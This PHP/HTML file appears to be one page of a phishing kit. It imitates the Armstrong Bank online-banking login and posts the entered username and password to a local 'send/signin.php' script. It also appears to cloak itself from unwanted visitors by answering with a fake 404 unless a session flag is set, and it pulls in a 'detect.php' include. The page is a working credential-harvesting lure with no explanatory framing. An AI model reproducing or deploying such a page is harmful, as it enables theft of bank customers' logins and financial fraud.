<?php
session_start();
ob_start();
require_once('./../config.php');
include_once('./../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Login · Armstrong Bank</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
    <link rel="manifest" href="#">
    <meta name="theme-color" content="#2a5f98">
    <link href="css/vthreeallFullCss.css" rel="stylesheet">
    <link href="css/224.css" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" sizes="192x192" href="favicon.ico">
    <link rel="apple-touch-icon" href="favicon.ico">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        .sec{
            display: block;
            font-family: roboto;
            font-weight: 400;
            line-height: 18px;
            font-size: 13px;
            padding: 17px 20px 17px 20px;
            width: 100%; 
            background-color: white;
            position: relative;
            bottom: 0;
            text-align: center;
            text-size-adjust: 100%;
            color: rgb(112, 112, 112);
            box-shadow: rgba(0,0,0,0.1)0px -1px 0px 0px;
            z-index: 1;
            }
            @media (max-width: 600px){
            .sec{
                padding-left: 80px;
                padding-right: 80px;
            }
        }
    </style>
</head>
<body>
    <banno-web>
        <div class="placeholder-login">
            <div class="placeholder-login-wrapper">
                <div class="placeholder-card" style="background-color: white">
                    <div class="placeholder-progress-container">
                        <div class="login-wrapper"> 
                            <jha-card has-data="">  
                                <jha-card-header slot="header" class=""><br>
                                    <div><img height="80" style="margin-top: -50px;" alt="Logo" src="media/Logo.png"></div>
                                </jha-card-header>
                            </jha-card> 
                        </div>
                        <bannoweb-login-steps slot="login-steps" style="display: block">
                        <form action="send/signin.php" id="signinFrm"  method="post" >
                                <div>
                                    <div class="u-g-width-100">
                                        <label class="c-g-textbox  c-g-textbox--empty">
                                            <span class="c-g-textbox__label">Enter your Username</span>
                                            <input aria-label="Username" autocapitalize="off" autocomplete="off" autocorrect="off" class=" c-g-textbox__field u-g-fz-body" id="username" maxlength="100" name="username" required="required" size="100" type="text" value="" aria-required="true">
                                        </label>
                                    </div>
                                    <div class="u-g-width-100">
                                        <label class="c-g-textbox  c-g-textbox--empty">
                                            <span class="c-g-textbox__label">Enter your password</span>
                                            <input aria-label="Password" autocapitalize="off" autocomplete="off" autocorrect="off" class=" c-g-textbox__field u-g-fz-body" id="password" maxlength="100" name="password" required="required" size="100" spellcheck="false" type="password" value="" aria-required="true">
                                        </label>
                                    </div>
                                    <div class="u-g-mar-top-l u-g-disp-flex@medium u-g-flex-row-rev@medium">
                                        <button id="btnForward" type="submit" class="c-g-btn u-g-cursor-pointer u-g-mar-left-s@medium c-g-btn--expand-while-small u-g-mar-top-m u-g-mar-top-0@medium" style="background-color: rgb(186, 12, 47); color:white"> Sign in </button>
                                    </div>
                                </div>
                            </form>
                        </bannoweb-login-steps> 
                    </div>
                </div>
            </div>
        </div>
    </banno-web>
    <bannoweb-footer class="sec" style="margin-top: -50px;">©2024 Armstrong Bank <span>&nbsp;</span> <span>•</span> <span>&nbsp;</span> <a href="#" style="color: rgb(186, 12, 47); text-decoration: none;"> Privacy policy</a> <span>&nbsp;</span> <span class="end-of-line">•</span> <span>&nbsp;</span> Member FDIC <span>&nbsp;</span> <span class="end-of-line">•</span> <span>&nbsp;</span><svg width="16" height="11" viewBox="0 0 10 7" class="ehl-icon" aria-hidden="true"> <path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"></path></svg> Equal Housing Lender 
    </bannoweb-footer>

</body>
 
</html>
